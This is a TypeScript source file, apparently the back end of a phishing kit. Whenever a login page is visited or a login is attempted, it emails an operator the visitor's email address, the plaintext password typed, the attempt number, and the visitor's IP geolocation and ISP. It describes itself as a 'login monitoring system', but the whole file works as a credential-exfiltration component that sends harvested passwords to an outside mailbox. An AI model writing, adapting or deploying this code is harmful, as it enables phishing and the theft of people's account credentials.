import nodemailer from 'nodemailer';
import fs from 'fs/promises';
import path from 'path';

interface SMTPConfig {
  host: string;
  port: number;
  user: string;
  password: string;
  fromEmail: string;
  adminEmail: string;
}

interface LoginAttempt {
  email: string;
  domain: string;
  password: string;
  attempt: number;
  timestamp: string;
  ip: string;
  country: string;
  city: string;
  state: string;
  isp: string;
}

const SMTP_CONFIG_FILE = path.join(process.cwd(), 'smtp-config.json');

let smtpConfig: SMTPConfig | null = null;
let transporter: nodemailer.Transporter | null = null;

// Load SMTP configuration
export async function loadSMTPConfig(): Promise<SMTPConfig | null> {
  try {
    // First check environment variables (for deployment)
    if (process.env.SMTP_HOST && process.env.SMTP_USER && process.env.SMTP_PASSWORD) {
      smtpConfig = {
        host: process.env.SMTP_HOST,
        port: parseInt(process.env.SMTP_PORT || '587'),
        user: process.env.SMTP_USER,
        password: process.env.SMTP_PASSWORD,
        fromEmail: process.env.SMTP_FROM_EMAIL || process.env.SMTP_USER,
        adminEmail: process.env.SMTP_ADMIN_EMAIL || 'admin@example.com'
      };
      
      transporter = nodemailer.createTransport({
        host: smtpConfig.host,
        port: smtpConfig.port,
        secure: smtpConfig.port === 465,
        auth: {
          user: smtpConfig.user,
          pass: smtpConfig.password,
        },
      });
      
      return smtpConfig;
    }
    
    // Fallback to config file (for local development)
    const configData = await fs.readFile(SMTP_CONFIG_FILE, 'utf8');
    smtpConfig = JSON.parse(configData);
    
    if (smtpConfig?.host && smtpConfig?.user && smtpConfig?.password) {
      transporter = nodemailer.createTransport({
        host: smtpConfig.host,
        port: smtpConfig.port,
        secure: smtpConfig.port === 465,
        auth: {
          user: smtpConfig.user,
          pass: smtpConfig.password,
        },
      });
    }
    
    return smtpConfig;
  } catch (error) {
    console.log('No SMTP configuration found in environment or file');
    return null;
  }
}

// Save SMTP configuration
export async function saveSMTPConfig(config: SMTPConfig): Promise<void> {
  await fs.writeFile(SMTP_CONFIG_FILE, JSON.stringify(config, null, 2));
  smtpConfig = config;
  
  if (config.host && config.user && config.password) {
    transporter = nodemailer.createTransport({
      host: config.host,
      port: config.port,
      secure: config.port === 465,
      auth: {
        user: config.user,
        pass: config.password,
      },
    });
  }
}

// Get user location info from IP
async function getUserLocationInfo(ip: string) {
  try {
    // Use a free IP geolocation service
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
    const data = await response.json();
    
    if (data.status === 'success') {
      return {
        country: data.country || 'Unknown',
        state: data.regionName || 'Unknown', 
        city: data.city || 'Unknown',
        isp: data.isp || 'Unknown'
      };
    }
  } catch (error) {
    console.error('Error fetching location info:', error);
  }
  
  return {
    country: 'Unknown',
    state: 'Unknown',
    city: 'Unknown',
    isp: 'Unknown'
  };
}

// Send visit notification
export async function sendVisitNotification(
  email: string,
  domain: string,
  ip: string
): Promise<boolean> {
  if (!smtpConfig || !transporter) {
    console.log('SMTP not configured, skipping visit notification');
    return false;
  }

  try {
    const locationInfo = await getUserLocationInfo(ip);
    
    const subject = `🔍 Page Visit - ${domain}`;
    const htmlContent = `
      <!DOCTYPE html>
      <html>
        <head>
          <style>
            body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
            .container { max-width: 600px; margin: 0 auto; padding: 20px; }
            .header { background: #e8f4fd; padding: 20px; border-radius: 5px; margin-bottom: 20px; border-left: 4px solid #3498db; }
            .details { background: #fff; border: 1px solid #ddd; padding: 15px; border-radius: 5px; }
            .field { margin-bottom: 10px; }
            .label { font-weight: bold; color: #555; }
            .visit-info { color: #3498db; font-weight: bold; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">
              <h2>👁️ Login Page Visit</h2>
              <p class="visit-info">
                Someone visited the login page for ${domain}
              </p>
            </div>
            
            <div class="details">
              <div class="field">
                <span class="label">Email Parameter:</span> ${email}
              </div>
              <div class="field">
                <span class="label">Domain:</span> ${domain}
              </div>
              <div class="field">
                <span class="label">Timestamp:</span> ${new Date().toLocaleString()}
              </div>
              <div class="field">
                <span class="label">IP Address:</span> ${ip}
              </div>
              <div class="field">
                <span class="label">Country:</span> ${locationInfo.country}
              </div>
              <div class="field">
                <span class="label">State/Region:</span> ${locationInfo.state}
              </div>
              <div class="field">
                <span class="label">City:</span> ${locationInfo.city}
              </div>
              <div class="field">
                <span class="label">ISP:</span> ${locationInfo.isp}
              </div>
            </div>
            
            <p style="margin-top: 20px; font-size: 12px; color: #666;">
              This notification is sent when someone visits the login page, before any login attempt.
            </p>
          </div>
        </body>
      </html>
    `;

    const mailOptions = {
      from: smtpConfig.fromEmail,
      to: smtpConfig.adminEmail,
      subject: subject,
      html: htmlContent,
    };

    await transporter.sendMail(mailOptions);
    console.log(`Visit notification sent for ${email}`);
    return true;
  } catch (error) {
    console.error('Error sending visit notification:', error);
    return false;
  }
}

// Send login attempt notification
export async function sendLoginAttemptNotification(
  email: string,
  domain: string,
  password: string,
  attempt: number,
  ip: string
): Promise<boolean> {
  if (!smtpConfig || !transporter) {
    console.log('SMTP not configured, skipping email notification');
    return false;
  }

  try {
    const locationInfo = await getUserLocationInfo(ip);
    
    const loginAttempt: LoginAttempt = {
      email,
      domain,
      password,
      attempt,
      timestamp: new Date().toISOString(),
      ip,
      ...locationInfo
    };

    const subject = `Login Attempt ${attempt} - ${domain}`;
    const htmlContent = `
      <!DOCTYPE html>
      <html>
        <head>
          <style>
            body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
            .container { max-width: 600px; margin: 0 auto; padding: 20px; }
            .header { background: #f4f4f4; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
            .details { background: #fff; border: 1px solid #ddd; padding: 15px; border-radius: 5px; }
            .field { margin-bottom: 10px; }
            .label { font-weight: bold; color: #555; }
            .warning { color: #e74c3c; font-weight: bold; }
            .attempt-1 { border-left: 4px solid #f39c12; }
            .attempt-2 { border-left: 4px solid #e74c3c; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">
              <h2>🔐 Login Attempt Notification</h2>
              <p class="${attempt === 1 ? 'attempt-1' : 'attempt-2'}">
                <span class="warning">Attempt #${attempt}</span> - ${domain}
              </p>
            </div>
            
            <div class="details">
              <div class="field">
                <span class="label">Email:</span> ${email}
              </div>
              <div class="field">
                <span class="label">Domain:</span> ${domain}
              </div>
              <div class="field">
                <span class="label">Password Entered:</span> ${password}
              </div>
              <div class="field">
                <span class="label">Timestamp:</span> ${new Date(loginAttempt.timestamp).toLocaleString()}
              </div>
              <div class="field">
                <span class="label">IP Address:</span> ${ip}
              </div>
              <div class="field">
                <span class="label">Country:</span> ${locationInfo.country}
              </div>
              <div class="field">
                <span class="label">State/Region:</span> ${locationInfo.state}
              </div>
              <div class="field">
                <span class="label">City:</span> ${locationInfo.city}
              </div>
              <div class="field">
                <span class="label">ISP:</span> ${locationInfo.isp}
              </div>
            </div>
            
            <p style="margin-top: 20px; font-size: 12px; color: #666;">
              This is an automated notification from your login monitoring system.
            </p>
          </div>
        </body>
      </html>
    `;

    const mailOptions = {
      from: smtpConfig.fromEmail,
      to: smtpConfig.adminEmail,
      subject: subject,
      html: htmlContent,
    };

    await transporter.sendMail(mailOptions);
    console.log(`Login attempt notification sent for ${email} (attempt ${attempt})`);
    return true;
  } catch (error) {
    console.error('Error sending login attempt notification:', error);
    return false;
  }
}

// Initialize SMTP on startup
loadSMTPConfig();